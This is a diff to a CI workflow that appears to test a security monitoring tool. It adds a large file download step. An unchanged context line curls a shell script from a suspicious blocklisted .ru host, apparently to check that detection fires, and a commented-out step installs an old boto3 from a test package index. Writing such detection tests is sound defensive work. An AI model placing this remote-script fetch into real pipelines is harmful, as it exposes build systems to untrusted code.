@@ -90,6 +90,9 @@ jobs:
       - name: Curl blacklisted host (Custom Builtins) - latest
         run: curl https://c8r5q.3-f72v.ru/wie4js1mje.sh
 
+      - name: Content length download
+        run: curl  -o 1GB.bin "https://nbg1-speed.hetzner.com/1GB.bin"
+
       # - name: Install with different checksum
       #   continue-on-error: true
       #   run: pip install --no-cache-dir --no-deps boto3==1.4.0 --index-url https://test.pypi.org/simple/
@@ -172,6 +175,7 @@ jobs:
           app_token: ${{ secrets.IR_API_KEY_CB_STAGE }}
           send_job_status: "true"
           debug: "true"
+
 
 
 
